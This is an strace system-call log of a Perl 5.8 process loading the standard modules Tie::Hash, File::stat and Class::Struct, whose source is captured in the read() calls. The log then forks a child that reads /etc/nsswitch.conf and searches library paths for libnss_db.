10562 07:33:35.043029 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.043040 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.043062 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  #  $_[0]->SUPER::DELETE($_[1])\n    }\n\n\n    package main;\n\n    tie %new_hash, \'NewHash\';\n    tie %new_std_hash, \'NewStdHash\';\n    tie %new_extra_hash, \'NewExtraHash\',\n\tsub {warn \"Doing \\U$_[1]\\E of $_[2].\\n\"};\n\n=head1 DESCRIPTION\n\nThis module provides some skeletal methods for hash-tying classes. See\nL<perltie> for a list of the functions required in order to tie a hash\nto a package. The basic B<Tie::Hash> package provides a C<new> method, as well\nas methods C<TIEHASH>, C<EXISTS> and C<CLEAR>. The B<Tie::StdHash> and\nB<Tie::ExtraHash> packages\nprovide most methods for hashes described in L<perltie> (the exceptions\nare C<UNTIE> and C<DESTROY>).  They cause tied hashes to behave exactly like standard hashes,\nand allow for selective overwriting of methods.  B<Tie::Hash> grandfathers the\nC<new> method: it is used if C<TIEHASH> is not defined\nin the case a class forgets to include a C<TIEHASH> method.\n\nFor developers wishing to write their own tied hashes, the required methods\nare briefly defined below. See the L<perltie> section for more detailed\ndescriptive, as well as example code:\n\n=over 4\n\n=item TIEHASH classname, LIST\n\nThe method invoked by the command C<tie %hash, classname>. Associates a new\nhash instance with the specified class. C<LIST> would represent additional\narguments (along the lines of L<AnyDBM_File> and compatriots) needed to\ncomplete the association.\n\n=item STORE this, key, value\n\nStore datum I<value> into I<key> for the tied hash I<this>.\n\n=item FETCH this, key\n\nRetrieve the datum in I<key> for the tied hash I<this>.\n\n=item FIRSTKEY this\n\nReturn the first key in the hash.\n\n=item NEXTKEY this, lastkey\n\nReturn the next key in the hash.\n\n=item EXISTS this, key\n\nVerify that I<key> exists with the tied hash I<this>.\n\nThe B<Tie::Hash> implementation is a stub that simply croaks.\n\n=item DELETE this, key\n\nDelete the key I<key> from the tied hash I<this>.\n\n=item CLEAR this\n\nClear all values from the tied hash I<this>.\n\n=item SCALAR this\n\nReturns what evaluating the hash in scalar context yields.\n\nB<Tie::Hash> does not implement this method (but B<Tie::StdHash>\nand B<Tie::ExtraHash> do).\n\n=back\n\n=head1 Inheriting from B<Tie::StdHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<tied(%tiedhash)>.  Thus overwritten\nC<TIEHASH> method should return a hash reference, and the remaining methods\nshould operate on the hash referenced by the first argument:\n\n  package ReportHash;\n  our @ISA = \'Tie::StdHash\';\n\n  sub TIEHASH  {\n    my $storage = bless {}, shift;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0]{$_[1]} = $_[2]\n  }\n\n\n=head1 Inheriting from B<Tie::ExtraHash>\n\nThe accessor methods assume that the actual storage for the data in the tied\nhash is in the hash referenced by C<(tied(%tiedhash))-E<gt>[0]>.  Thus overwritten\nC<TIEHASH> method should return an array reference with the first\nelement being a hash refer", 4096) = 4096
10562 07:33:35.043405 read(8, "ence, and the remaining methods should operate on the\nhash C<< %{ $_[0]->[0] } >>:\n\n  package ReportHash;\n  our @ISA = \'Tie::ExtraHash\';\n\n  sub TIEHASH  {\n    my $class = shift;\n    my $storage = bless [{}, @_], $class;\n    warn \"New ReportHash created, stored in $storage.\\n\";\n    $storage;\n  }\n  sub STORE    {\n    warn \"Storing data with key $_[1] at $_[0].\\n\";\n    $_[0][0]{$_[1]} = $_[2]\n  }\n\nThe default C<TIEHASH> method stores \"extra\" arguments to tie() starting\nfrom offset 1 in the array referenced by C<tied(%tiedhash)>; this is the\nsame storage algorithm as in TIEHASH subroutine above.  Hence, a typical\npackage inheriting from B<Tie::ExtraHash> does not need to overwrite this\nmethod.\n\n=head1 C<SCALAR>, C<UNTIE> and C<DESTROY>\n\nThe methods C<UNTIE> and C<DESTROY> are not defined in B<Tie::Hash>,\nB<Tie::StdHash>, or B<Tie::ExtraHash>.  Tied hashes do not require\npresence of these methods, but if defined, the methods will be called in\nproper time, see L<perltie>.\n\nC<SCALAR> is only defined in B<Tie::StdHash> and B<Tie::ExtraHash>.\n\nIf needed, these methods should be defined by the package inheriting from\nB<Tie::Hash>, B<Tie::StdHash>, or B<Tie::ExtraHash>. See L<pertie/\"SCALAR\">\nto find out what happens when C<SCALAR> does not exist.\n\n=head1 MORE INFORMATION\n\nThe packages relating to various DBM-related implementations (F<DB_File>,\nF<NDBM_File>, etc.) show examples of general tied hashes, as does the\nL<Config> module. While these do not utilize B<Tie::Hash>, they serve as\ngood working examples.\n\n=cut\n\nuse Carp;\nuse warnings::register;\n\nsub new {\n    my $pkg = shift;\n    $pkg->TIEHASH(@_);\n}\n\n# Grandfather \"new\"\n\nsub TIEHASH {\n    my $pkg = shift;\n    if (defined &{\"${pkg}::new\"}) {\n\twarnings::warnif(\"WARNING: calling ${pkg}->new since ${pkg}->TIEHASH is missing\");\n\t$pkg->new(@_);\n    }\n    else {\n\tcroak \"$pkg doesn\'t define a TIEHASH method\";\n    }\n}\n\nsub EXISTS {\n    my $pkg = ref $_[0];\n    croak \"$pkg doesn\'t define an EXISTS method\";\n}\n\nsub CLEAR {\n    my $self = shift;\n    my $key = $self->FIRSTKEY(@_);\n    my @keys;\n\n    while (defined $key) {\n\tpush @keys, $key;\n\t$key = $self->NEXTKEY(@_, $key);\n    }\n    foreach $key (@keys) {\n\t$self->DELETE(@_, $key);\n    }\n}\n\n# The Tie::StdHash package implements standard perl hash behaviour.\n# It exists to act as a base class for classes which only wish to\n# alter some parts of their behaviour.\n\npackage Tie::StdHash;\n# @ISA = qw(Tie::Hash);\t\t# would inherit new() only\n\nsub TIEHASH  { bless {}, $_[0] }\nsub STORE    { $_[0]->{$_[1]} = $_[2] }\nsub FETCH    { $_[0]->{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0]}; each %{$_[0]} }\nsub NEXTKEY  { each %{$_[0]} }\nsub EXISTS   { exists $_[0]->{$_[1]} }\nsub DELETE   { delete $_[0]->{$_[1]} }\nsub CLEAR    { %{$_[0]} = () }\nsub SCALAR   { scalar %{$_[0]} }\n\npackage Tie::ExtraHash;\n\nsub TIEHASH  { my $p = shift; bless [{}, @_], $p }\nsub STORE    { $_[0][0]{$_[1]} = $_[2] }\nsub FETCH    { $_[0][0]{$_[1]} }\nsub FIRSTKEY { my $a = scalar keys %{$_[0][0]}; each %{$_[0][0]} }\nsub NEXTKEY  { each %{$_[0][0]} }\nsub EXISTS   { exists $_[0][0]->{$_[1]} }\nsub DELETE   { delete $_[0][0]->{$_[1]} }\nsub CLEAR    { %{$_[0][0]} = () }\nsub SCALAR   { scalar %{$_[0][0]} }\n\n1;\n", 4096) = 3208
10562 07:33:35.043992 read(8, "", 4096) = 0
10562 07:33:35.044008 close(8)          = 0
10562 07:33:35.044038 stat64("/etc/perl/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044053 stat64("/etc/perl/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044067 stat64("/usr/local/lib/perl/5.8.8/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044080 stat64("/usr/local/lib/perl/5.8.8/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044098 stat64("/usr/local/share/perl/5.8.8/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044111 stat64("/usr/local/share/perl/5.8.8/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044125 stat64("/usr/lib/perl5/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044137 stat64("/usr/lib/perl5/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044150 stat64("/usr/share/perl5/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044163 stat64("/usr/share/perl5/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044176 stat64("/usr/lib/perl/5.8/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044189 stat64("/usr/lib/perl/5.8/File/stat.pm", 0xbfbc5b7c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044202 stat64("/usr/share/perl/5.8/File/stat.pmc", 0xbfbc5c6c) = -1 ENOENT (No such file or directory)
10562 07:33:35.044215 stat64("/usr/share/perl/5.8/File/stat.pm", {st_mode=S_IFREG|0644, st_size=3372, ...}) = 0
10562 07:33:35.044237 open("/usr/share/perl/5.8/File/stat.pm", O_RDONLY|O_LARGEFILE) = 8
10562 07:33:35.044251 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc5988) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.044263 _llseek(8, 0, [0], SEEK_CUR) = 0
10562 07:33:35.044279 read(8, "package File::stat;\nuse 5.006;\n\nuse strict;\nuse warnings;\n\nour(@EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n\nour $VERSION = \'1.00\';\n\nBEGIN { \n    use Exporter   ();\n    @EXPORT      = qw(stat lstat);\n    @EXPORT_OK   = qw( $st_dev\t   $st_ino    $st_mode \n\t\t       $st_nlink   $st_uid    $st_gid \n\t\t       $st_rdev    $st_size \n\t\t       $st_atime   $st_mtime  $st_ctime \n\t\t       $st_blksize $st_blocks\n\t\t    );\n    %EXPORT_TAGS = ( FIELDS => [ @EXPORT_OK, @EXPORT ] );\n}\nuse vars @EXPORT_OK;\n\n# Class::Struct forbids use of @ISA\nsub import { goto &Exporter::import }\n\nuse Class::Struct qw(struct);\nstruct \'File::stat\' => [\n     map { $_ => \'$\' } qw{\n\t dev ino mode nlink uid gid rdev size\n\t atime mtime ctime blksize blocks\n     }\n];\n\nsub populate (@) {\n    return unless @_;\n    my $stob = new();\n    @$stob = (\n\t$st_dev, $st_ino, $st_mode, $st_nlink, $st_uid, $st_gid, $st_rdev,\n        $st_size, $st_atime, $st_mtime, $st_ctime, $st_blksize, $st_blocks ) \n\t    = @_;\n    return $stob;\n} \n\nsub lstat ($)  { populate(CORE::lstat(shift)) }\n\nsub stat ($) {\n    my $arg = shift;\n    my $st = populate(CORE::stat $arg);\n    return $st if $st;\n\tmy $fh;\n    {\n\t\tlocal $!;\n\t\tno strict \'refs\';\n\t\trequire Symbol;\n\t\t$fh = \\*{ Symbol::qualify( $arg, caller() )};\n\t\treturn unless defined fileno $fh;\n\t}\n    return populate(CORE::stat $fh);\n}\n\n1;\n__END__\n\n=head1 NAME\n\nFile::stat - by-name interface to Perl\'s built-in stat() functions\n\n=head1 SYNOPSIS\n\n use File::stat;\n $st = stat($file) or die \"No $file: $!\";\n if ( ($st->mode & 0111) && $st->nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n use File::stat qw(:FIELDS);\n stat($file) or die \"No $file: $!\";\n if ( ($st_mode & 0111) && $st_nlink > 1) ) {\n     print \"$file is executable with lotsa links\\n\";\n } \n\n=head1 DESCRIPTION\n\nThis module\'s default exports override the core stat() \nand lstat() functions, replacing them with versions that return \n\"File::stat\" objects.  This object has methods that\nreturn the similarly named structure field name from the\nstat(2) function; namely,\ndev,\nino,\nmode,\nnlink,\nuid,\ngid,\nrdev,\nsize,\natime,\nmtime,\nctime,\nblksize,\nand\nblocks.  \n\nYou may also import all the structure fields directly into your namespace\nas regular variables using the :FIELDS import tag.  (Note that this still\noverrides your stat() and lstat() functions.)  Access these fields as\nvariables named with a preceding C<st_> in front their method names.\nThus, C<$stat_obj-E<gt>dev()> corresponds to $st_dev if you import\nthe fields.\n\nTo access this functionality without the core overrides,\npass the C<use> an empty import list, and then access\nfunction functions with their full qualified names.\nOn the other hand, the built-ins are still available\nvia the C<CORE::> pseudo-package.\n\n=head1 BUGS\n\nAs of Perl 5.8.0 after using this module you cannot use the implicit\nC<$_> or the special filehandle C<_> with stat() or lstat(), trying\nto do so leads into strange errors.  The workaround is for C<$_> to\nbe explicit\n\n    my $stat_obj = stat $_;\n\nand for C<_> to explicitly populate the object using the unexported\nand undocumented populate() function with CORE::stat():\n\n    my $stat_obj = File::stat::populate(CORE::stat(_));\n\n=head1 NOTE\n\nWhile this class is currently implemented using the Class::Struct\nmodule to build a struct-like class, you shouldn\'t rely upon this.\n\n=head1 AUTHOR\n\nTom Christiansen\n", 4096) = 3372
10562 07:33:35.044729 stat64("/etc/perl/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044747 stat64("/etc/perl/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044761 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044774 stat64("/usr/local/lib/perl/5.8.8/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044789 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044802 stat64("/usr/local/share/perl/5.8.8/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044816 stat64("/usr/lib/perl5/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044828 stat64("/usr/lib/perl5/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044851 stat64("/usr/share/perl5/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044865 stat64("/usr/share/perl5/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044906 stat64("/usr/lib/perl/5.8/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044936 stat64("/usr/lib/perl/5.8/Class/Struct.pm", 0xbfbc56cc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044950 stat64("/usr/share/perl/5.8/Class/Struct.pmc", 0xbfbc57bc) = -1 ENOENT (No such file or directory)
10562 07:33:35.044963 stat64("/usr/share/perl/5.8/Class/Struct.pm", {st_mode=S_IFREG|0644, st_size=20512, ...}) = 0
10562 07:33:35.044984 open("/usr/share/perl/5.8/Class/Struct.pm", O_RDONLY|O_LARGEFILE) = 10
10562 07:33:35.044999 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfbc54d8) = -1 ENOTTY (Inappropriate ioctl for device)
10562 07:33:35.045011 _llseek(10, 0, [0], SEEK_CUR) = 0
10562 07:33:35.045029 read(10, "package Class::Struct;\n\n## See POD after __END__\n\nuse 5.006_001;\n\nuse strict;\nuse warnings::register;\nour(@ISA, @EXPORT, $VERSION);\n\nuse Carp;\n\nrequire Exporter;\n@ISA = qw(Exporter);\n@EXPORT = qw(struct);\n\n$VERSION = \'0.63\';\n\n## Tested on 5.002 and 5.003 without class membership tests:\nmy $CHECK_CLASS_MEMBERSHIP = ($] >= 5.003_95);\n\nmy $print = 0;\nsub printem {\n    if (@_) { $print = shift }\n    else    { $print++ }\n}\n\n{\n    package Class::Struct::Tie_ISA;\n\n    sub TIEARRAY {\n        my $class = shift;\n        return bless [], $class;\n    }\n\n    sub STORE {\n        my ($self, $index, $value) = @_;\n        Class::Struct::_subclass_error();\n    }\n\n    sub FETCH {\n        my ($self, $index) = @_;\n        $self->[$index];\n    }\n\n    sub FETCHSIZE {\n        my $self = shift;\n        return scalar(@$self);\n    }\n\n    sub DESTROY { }\n}\n\nsub import {\n    my $self = shift;\n\n    if ( @_ == 0 ) {\n      $self->export_to_level( 1, $self, @EXPORT );\n    } elsif ( @_ == 1 ) {\n\t# This is admittedly a little bit silly:\n\t# do we ever export anything else than \'struct\'...?\n      $self->export_to_level( 1, $self, @_ );\n    } else {\n      goto &struct;\n    }\n}\n\nsub struct {\n\n    # Determine parameter list structure, one of:\n    #   struct( class => [ element-list ])\n    #   struct( class => { element-list })\n    #   struct( element-list )\n    # Latter form assumes current package name as struct name.\n\n    my ($class, @decls);\n    my $base_type = ref $_[1];\n    if ( $base_type eq \'HASH\' ) {\n        $class = shift;\n        @decls = %{shift()};\n        _usage_error() if @_;\n    }\n    elsif ( $base_type eq \'ARRAY\' ) {\n        $class = shift;\n        @decls = @{shift()};\n        _usage_error() if @_;\n    }\n    else {\n        $base_type = \'ARRAY\';\n        $class = (caller())[0];\n        @decls = @_;\n    }\n\n    _usage_error() if @decls % 2 == 1;\n\n    # Ensure we are not, and will not be, a subclass.\n\n    my $isa = do {\n        no strict \'refs\';\n        \\@{$class . \'::ISA\'};\n    };\n    _subclass_error() if @$isa;\n    tie @$isa, \'Class::Struct::Tie_ISA\';\n\n    # Create constructor.\n\n    croak \"function \'new\' already defined in package $class\"\n        if do { no strict \'refs\'; defined &{$class . \"::new\"} };\n\n    my @methods = ();\n    my %refs = ();\n    my %arrays = ();\n    my %hashes = ();\n    my %classes = ();\n    my $got_class = 0;\n    my $out = \'\';\n\n    $out = \"{\\n  package $class;\\n  use Carp;\\n  sub new {\\n\";\n    $out .= \"    my (\\$class, \\%init) = \\@_;\\n\";\n    $out .= \"    \\$class = __PACKAGE__ unless \\@_;\\n\";\n\n    my $cnt = 0;\n    my $idx = 0;\n    my( $cmt, $name, $type, $elem );\n\n    if( $base_type eq \'HASH\' ){\n        $out .= \"    my(\\$r) = {};\\n\";\n        $cmt = \'\';\n    }\n    elsif( $base_type eq \'ARRAY\' ){\n        $out .= \"    my(\\$r) = [];\\n\";\n    }\n    while( $idx < @decls ){\n        $name = $decls[$idx];\n        $type = $decls[$idx+1];\n        push( @methods, $name );\n        if( $base_type eq \'HASH\' ){\n            $elem = \"{\'${class}::$name\'}\";\n        }\n        elsif( $base_type eq \'ARRAY\' ){\n            $elem = \"[$cnt]\";\n            ++$cnt;\n            $cmt = \" # $name\";\n        }\n        if( $type =~ /^\\*(.)/ ){\n            $refs{$name}++;\n            $type = $1;\n        }\n        my $init = \"defined(\\$init{\'$name\'}) ? \\$init{\'$name\'} :\";\n        if( $type eq \'@\' ){\n            $out .= \"    croak \'Initializer for $name must be array reference\'\\n\"; \n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'ARRAY\';\\n\";\n            $out .= \"    \\$r->$elem = $init [];$cmt\\n\"; \n            $arrays{$name}++;\n        }\n        elsif( $type eq \'%\' ){\n            $out .= \"    croak \'Initializer for $name must be hash reference\'\\n\";\n            $out .= \"        if defined(\\$init{\'$name\'}) && ref(\\$init{\'$name\'}) ne \'HASH\';\\n\";\n            $out .= \"    \\$r->$elem = $init {};$cmt\\n\";\n            $hashes{$name}++;\n        }\n        elsif ( $type eq \'$\') {\n            $out .= \"    \\$r->$elem = $init undef;$cmt\\n\";\n        }\n        elsif( $type =~ /^\\w+(?:::\\w+)*$/ ){\n            $out .= \"    if (defined(\\$init{\'$name\'}))", 4096) = 4096
10562 07:33:35.045338 brk(0x82de000)    = 0x82de000
10562 07:33:35.045528 read(10, " {\\n\";\n           $out .= \"       if (ref \\$init{\'$name\'} eq \'HASH\')\\n\";\n            $out .= \"            { \\$r->$elem = $type->new(\\%{\\$init{\'$name\'}}) } $cmt\\n\";\n           $out .= \"       elsif (UNIVERSAL::isa(\\$init{\'$name\'}, \'$type\'))\\n\";\n            $out .= \"            { \\$r->$elem = \\$init{\'$name\'} } $cmt\\n\";\n            $out .= \"       else { croak \'Initializer for $name must be hash or $type reference\' }\\n\";\n            $out .= \"    }\\n\";\n            $classes{$name} = $type;\n            $got_class = 1;\n        }\n        else{\n            croak \"\'$type\' is not a valid struct element type\";\n        }\n        $idx += 2;\n    }\n    $out .= \"    bless \\$r, \\$class;\\n  }\\n\";\n\n    # Create accessor methods.\n\n    my( $pre, $pst, $sel );\n    $cnt = 0;\n    foreach $name (@methods){\n        if ( do { no strict \'refs\'; defined &{$class . \"::$name\"} } ) {\n            warnings::warnif(\"function \'$name\' already defined, overrides struct accessor method\");\n        }\n        else {\n            $pre = $pst = $cmt = $sel = \'\';\n            if( defined $refs{$name} ){\n                $pre = \"\\\\(\";\n                $pst = \")\";\n                $cmt = \" # returns ref\";\n            }\n            $out .= \"  sub $name {$cmt\\n    my \\$r = shift;\\n\";\n            if( $base_type eq \'ARRAY\' ){\n                $elem = \"[$cnt]\";\n                ++$cnt;\n            }\n            elsif( $base_type eq \'HASH\' ){\n                $elem = \"{\'${class}::$name\'}\";\n            }\n            if( defined $arrays{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\"; \n                $out .= \"    if (ref(\\$i) eq \'ARRAY\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->[\\$i]\";\n            }\n            elsif( defined $hashes{$name} ){\n                $out .= \"    my \\$i;\\n\";\n                $out .= \"    \\@_ ? (\\$i = shift) : return \\$r->$elem;\\n\";\n                $out .= \"    if (ref(\\$i) eq \'HASH\' && !\\@_) { \\$r->$elem = \\$i; return \\$r }\\n\";\n                $sel = \"->{\\$i}\";\n            }\n            elsif( defined $classes{$name} ){\n                if ( $CHECK_CLASS_MEMBERSHIP ) {\n                    $out .= \"    croak \'$name argument is wrong class\' if \\@_ && ! UNIVERSAL::isa(\\$_[0], \'$classes{$name}\');\\n\";\n                }\n            }\n            $out .= \"    croak \'Too many args to $name\' if \\@_ > 1;\\n\";\n            $out .= \"    \\@_ ? ($pre\\$r->$elem$sel = shift$pst) : $pre\\$r->$elem$sel$pst;\\n\";\n            $out .= \"  }\\n\";\n        }\n    }\n    $out .= \"}\\n1;\\n\";\n\n    print $out if $print;\n    my $result = eval $out;\n    carp $@ if $@;\n}\n\nsub _usage_error {\n    confess \"struct usage error\";\n}\n\nsub _subclass_error {\n    croak \'struct class cannot be a subclass (@ISA not allowed)\';\n}\n\n1; # for require\n\n\n__END__\n\n=head1 NAME\n\nClass::Struct - declare struct-like datatypes as Perl classes\n\n=head1 SYNOPSIS\n\n    use Class::Struct;\n            # declare struct, based on array:\n    struct( CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ]);\n            # declare struct, based on hash:\n    struct( CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... });\n\n    package CLASS_NAME;\n    use Class::Struct;\n            # declare struct, based on array, implicit class name:\n    struct( ELEMENT_NAME => ELEMENT_TYPE, ... );\n\n    # Declare struct at compile time\n    use Class::Struct CLASS_NAME => [ ELEMENT_NAME => ELEMENT_TYPE, ... ];\n    use Class::Struct CLASS_NAME => { ELEMENT_NAME => ELEMENT_TYPE, ... };\n\n    # declare struct at compile time, based on array, implicit class name:\n    package CLASS_NAME;\n    use Class::Struct ELEMENT_NAME => ELEMENT_TYPE, ... ;\n\n    package Myobj;\n    use Class::Struct;\n            # declare struct with four types of elements:\n    struct( s => \'$\', a => \'@\', h => \'%\', c => \'My_Other_Class\' );\n\n    $obj = new Myobj;               # constructor\n\n                                    # scalar type accessor:\n    $element_value = $obj->s;           # element value\n    $obj->s(\'new value\');               # assign to element\n\n                             ", 4096) = 4096
10562 07:33:35.046159 _llseek(10, 6916, [6916], SEEK_SET) = 0
10562 07:33:35.046177 _llseek(10, 0, [6916], SEEK_CUR) = 0
10562 07:33:35.046187 close(10)         = 0
10562 07:33:35.046355 _llseek(8, 1334, [1334], SEEK_SET) = 0
10562 07:33:35.046371 _llseek(8, 0, [1334], SEEK_CUR) = 0
10562 07:33:35.046381 close(8)          = 0
10562 07:33:35.047055 brk(0x82ff000)    = 0x82ff000
10562 07:33:35.047197 _llseek(6, 2689, [2689], SEEK_SET) = 0
10562 07:33:35.047217 _llseek(6, 0, [2689], SEEK_CUR) = 0
10562 07:33:35.047228 close(6)          = 0
10562 07:33:35.047368 clone(child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d20908) = 10563
10563 07:33:35.056090 getppid()         = 10562
10563 07:33:35.056584 open("/etc/nsswitch.conf", O_RDONLY) = 6
10563 07:33:35.056610 fstat64(6, {st_mode=S_IFREG|0644, st_size=475, ...}) = 0
10563 07:33:35.056629 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7ee6000
10563 07:33:35.056643 read(6, "# /etc/nsswitch.conf\n#\n# Example configuration of GNU Name Service Switch functionality.\n# If you have the `glibc-doc-reference\' and `info\' packages installed, try:\n# `info libc \"Name Service Switch\"\' for information about this file.\n\npasswd:         compat\ngroup:          compat\nshadow:         compat\n\nhosts:          files dns\nnetworks:       files\n\nprotocols:      db files\nservices:       db files\nethers:         db files\nrpc:            db files\n\nnetgroup:       nis\n", 4096) = 475
10563 07:33:35.056693 read(6, "", 4096) = 0
10563 07:33:35.056703 close(6)          = 0
10563 07:33:35.056713 munmap(0xb7ee6000, 4096) = 0
10563 07:33:35.056740 open("/etc/ld.so.cache", O_RDONLY) = 6
10563 07:33:35.056754 fstat64(6, {st_mode=S_IFREG|0644, st_size=29913, ...}) = 0
10563 07:33:35.056770 mmap2(NULL, 29913, PROT_READ, MAP_PRIVATE, 6, 0) = 0xb7ced000
10563 07:33:35.056782 close(6)          = 0
10563 07:33:35.056792 access("/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
10563 07:33:35.056810 open("/lib/tls/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056824 stat64("/lib/tls/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.056838 open("/lib/tls/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056852 stat64("/lib/tls/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.056863 open("/lib/tls/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056876 stat64("/lib/tls/i686/cmov", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.056893 open("/lib/tls/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056906 stat64("/lib/tls/i686", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.056923 open("/lib/tls/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056935 stat64("/lib/tls/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.056946 open("/lib/tls/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056958 stat64("/lib/tls/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.056969 open("/lib/tls/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.056981 stat64("/lib/tls/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057004 open("/lib/tls/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057043 stat64("/lib/tls", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
10563 07:33:35.057074 open("/lib/i686/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057087 stat64("/lib/i686/sse2/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057098 open("/lib/i686/sse2/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057110 stat64("/lib/i686/sse2", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057122 open("/lib/i686/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057134 stat64("/lib/i686/cmov", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057158 open("/lib/i686/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
10563 07:33:35.057169 stat64("/lib/i686", 0xbfbc605c) = -1 ENOENT (No such file or directory)
10563 07:33:35.057185 open("/lib/sse2/cmov/libnss_db.so.2", O_RDONLY) = -1 ENOENT (No such file or directory)
